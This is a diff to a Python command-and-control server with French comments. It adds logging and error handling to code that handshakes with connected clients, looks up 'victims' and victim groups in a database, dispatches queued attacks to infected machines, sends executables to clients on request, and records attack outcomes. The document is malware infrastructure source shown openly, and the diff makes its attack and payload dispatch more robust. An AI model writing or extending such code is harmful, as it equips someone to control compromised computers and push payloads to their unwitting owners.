@@ -8,6 +8,7 @@ import threading
 import rsa
 import base64
 import re
+import logging
 
 from env import *
 from database import *
@@ -21,7 +22,7 @@ from queue import Queue, Empty
 
 
 
-def start_server(port):
+def start_server(port, logger):
     clients = []
 
     # Socket
@@ -68,6 +69,7 @@ def start_server(port):
 
                 # Handshake
                 print("(+) handshake with " + str(addr))
+                logger.info("(+) handshake with " + str(addr))
 
                 # Récupération de la clé publique du client (451 octets)
                 public_key = rsa.PublicKey.load_pkcs1_openssl_pem(conn.recv(451))
@@ -139,6 +141,7 @@ def start_server(port):
         for attack in attacks:
             print("[+] executing attack :")
             print("\t {}", str(attack))
+            logger.info("lancement de l'attaque : " + str(attack) +" sur le groupe : " + str(attack[1]))
 
             # Récupération des ordinateurs du groupe
             query = "SELECT uid FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = %s)"
@@ -199,8 +202,12 @@ def start_server(port):
                 for client in clients:
                     print("[+] executing victim attack :")
                     print("\t[+]", str(attack[2]))
-
-                    execute_attack(client, attack)
+                    
+                    try:
+                        execute_attack(client, attack)
+                        logger.info("lancement de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid))
+                    except Exception as e:
+                        logger.error("erreur lors de l'envoi de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid) + " : " + str(e))
 
                     # Mise à jour de l'attaque
                     query = "UPDATE victim_attacks SET state = 'running' WHERE id = %s"
@@ -225,6 +232,9 @@ def start_server(port):
                 if client_data == b'disconnected':
                     print("[-] client disconnected " + str(client['addr']))
 
+                    # Mise à jour du statut dans la base de données
+                    update_status(db, mycursor, client['uid'])
+
                     # Arrêt du thread d'émission
                     client['emission_queue'].put(b"stop-thread")
 
@@ -240,7 +250,12 @@ def start_server(port):
 
                 if "request" in client_message:
                     # envoyer l'executable au client
-                    send_executable_to_client(client_message["request"], client['os'], client['sym_key'], client['iv'], client['reception_queue'], client['emission_queue'])
+                    try:
+                        send_executable_to_client(client_message["request"], client['os'], client['sym_key'], client['iv'], client['reception_queue'], client['emission_queue'])
+                        logger.info("envoi de l'executable : " + client_message["request"] + " au client : " + str(client['uid']))
+                    except Exception as e:
+                        print("[-] error while sending executable to client : " + str(e))
+                        logger.error("erreur lors de l'envoi de l'executable : " + client_message["request"] + " au client : " + str(client['uid']) + " : " + str(e))
 
                 elif "attack" in client_message :
                     # interpreter le resultat de l'attaque
@@ -259,7 +274,7 @@ def start_server(port):
 
                     db.commit()
 
-
+                    logger.info("attaque : " + str(attack_id) + " terminée")
                     print("[+] attack updated in the database (done !)")
 
 
